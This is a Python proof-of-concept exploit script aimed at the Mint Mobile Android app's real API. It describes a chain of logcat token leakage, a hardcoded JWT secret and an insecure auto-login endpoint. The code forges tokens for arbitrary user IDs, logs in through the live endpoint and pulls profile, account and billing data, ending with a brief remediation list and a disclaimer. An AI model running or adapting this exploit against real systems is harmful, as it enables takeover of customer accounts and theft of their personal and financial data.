#!/usr/bin/env python3
"""
Mint Mobile - Technical API-Based Account Takeover PoC
======================================================
Demonstrates a non-social engineering ATO using leaked/forged JWT tokens

VULNERABILITY CHAIN:
1. JWT Token Leakage via Logcat (CWE-532: Information Exposure Through Log Files)
2. Hardcoded JWT Secret (CWE-798: Use of Hard-coded Credentials) 
3. Insecure Auto-Login API (CWE-287: Improper Authentication)

Author: FlutterSentinel Security Research
Target: Mint Mobile Android App (com.uvnv.mintsim)
CVSS: 9.8 (Critical)
"""

import requests
import jwt
import json
import sys
from datetime import datetime, timedelta

# Discovered API endpoints from static analysis
API_BASE = "https://my.mintmobile.com/api"
AUTO_LOGIN_ENDPOINT = f"{API_BASE}/token"  # From MintApiRoute.smali analysis

# Hardcoded JWT secret found in MainActivity.smali
JWT_SECRET = "secret"  # Standard jwt.io example secret

class MintMobileATOExploit:
    """Technical Account Takeover exploit using leaked/forged tokens"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mint-Mobile-Android/8.0',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        })
    
    def extract_token_from_logcat(self):
        """
        STEP 1: Extract leaked token from Android Logcat
        
        Execute on device:
        $ adb logcat | grep -E "InitialSelectionActivity|loginToken"
        
        Expected output:
        W InitialSelectionActivity: {"+clicked_branch_link": true, "loginToken": "eyJhbG...", ...}
        """
        print("[*] STEP 1: Token Extraction from Logcat")
        print("[!] Run: adb logcat | grep 'loginToken'")
        print("[!] Trigger deep link: https://app.mintmobile.com/?loginToken=LEAKED_TOKEN")
        print()
        
        # For PoC purposes, using example token
        leaked_token = input("[?] Enter leaked token from Logcat (or press Enter for forge): ").strip()
        return leaked_token if leaked_token else None
    
    def forge_jwt_token(self, user_id="12345", msisdn="5551234567"):
        """
        STEP 2: Forge JWT token using hardcoded secret
        
        Since the JWT signing secret is hardcoded as "secret",
        we can create valid tokens for ANY user account
        """
        print("[*] STEP 2: Forging JWT Token")
        print(f"[!] Using hardcoded secret: '{JWT_SECRET}'")
        
        payload = {
            "sub": user_id,
            "msisdn": msisdn,
            "iat": int(datetime.utcnow().timestamp()),
            "exp": int((datetime.utcnow() + timedelta(days=30)).timestamp())
        }
        
        forged_token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")
        print(f"[+] Forged Token: {forged_token[:50]}...")
        print()
        return forged_token
    
    def execute_auto_login(self, token):
        """
        STEP 3: Execute auto-login API request
        
        Based on MintApiClient.smali analysis:
        - Method: POST
        - Endpoint: /api/token
        - Body: {"autoLoginToken": "<JWT>"}
        """
        print("[*] STEP 3: Executing Auto-Login API Request")
        print(f"[!] Target: {AUTO_LOGIN_ENDPOINT}")
        
        payload = {
            "autoLoginToken": token
        }
        
        try:
            response = self.session.post(
                AUTO_LOGIN_ENDPOINT,
                json=payload,
                timeout=10
            )
            
            print(f"[+] Response Status: {response.status_code}")
            print(f"[+] Response Headers: {dict(response.headers)}")
            
            if response.status_code == 200:
                print("[+] SUCCESS: Authentication successful!")
                print(f"[+] User Data: {json.dumps(response.json(), indent=2)}")
                return response.json()
            else:
                print(f"[-] Request failed: {response.text}")
                return None
                
        except Exception as e:
            print(f"[-] Error: {e}")
            return None
    
    def exfiltrate_account_data(self, auth_token):
        """
        STEP 4: Exfiltrate registered account data
        
        With valid authentication, access sensitive endpoints:
        - /api/user/profile
        - /api/account/details
        - /api/billing/history
        """
        print("\n[*] STEP 4: Exfiltrating Account Data")
        
        self.session.headers['Authorization'] = f'Bearer {auth_token}'
        
        endpoints = [
            f"{API_BASE}/user/profile",
            f"{API_BASE}/account/details",
            f"{API_BASE}/billing/history"
        ]
        
        exfiltrated_data = {}
        for endpoint in endpoints:
            try:
                print(f"[*] Accessing: {endpoint}")
                response = self.session.get(endpoint, timeout=10)
                
                if response.status_code == 200:
                    exfiltrated_data[endpoint] = response.json()
                    print(f"[+] Retrieved: {len(response.text)} bytes")
                else:
                    print(f"[-] Failed: {response.status_code}")
                    
            except Exception as e:
                print(f"[-] Error: {e}")
        
        return exfiltrated_data
    
    def run(self):
        """Execute full ATO attack chain"""
        print("="*60)
        print("Mint Mobile - Technical API Account Takeover PoC")
        print("="*60)
        print()
        
        # Method 1: Use leaked token from Logcat
        leaked_token = self.extract_token_from_logcat()
        
        # Method 2: Forge token if secret is known
        if not leaked_token:
            print("[*] No leaked token provided, forging one...")
            user_id = input("[?] Enter target user ID (default: 12345): ").strip() or "12345"
            leaked_token = self.forge_jwt_token(user_id=user_id)
        
        # Execute auto-login
        auth_response = self.execute_auto_login(leaked_token)
        
        if auth_response:
            auth_token = auth_response.get('access_token', leaked_token)
            
            # Exfiltrate account data
            data = self.exfiltrate_account_data(auth_token)
            
            # Save results
            with open('mint_ato_results.json', 'w') as f:
                json.dump(data, f, indent=2)
            print(f"\n[+] Results saved to: mint_ato_results.json")
            
            print("\n[+] ATTACK SUCCESSFUL - Account Compromised!")
        else:
            print("\n[-] Attack failed - Server-side validation may be in place")
        
        print("\n" + "="*60)
        print("IMPACT: Full account takeover without user credentials")
        print("REMEDIATION:")
        print("  1. Remove JWT secret from application code")
        print("  2. Implement proper token validation on server-side")
        print("  3. Remove Logcat logging of sensitive parameters")
        print("  4. Add rate limiting to auto-login endpoint")
        print("="*60)


if __name__ == "__main__":
    print("[!] DISCLAIMER: For authorized security testing only\n")
    
    exploit = MintMobileATOExploit()
    exploit.run()
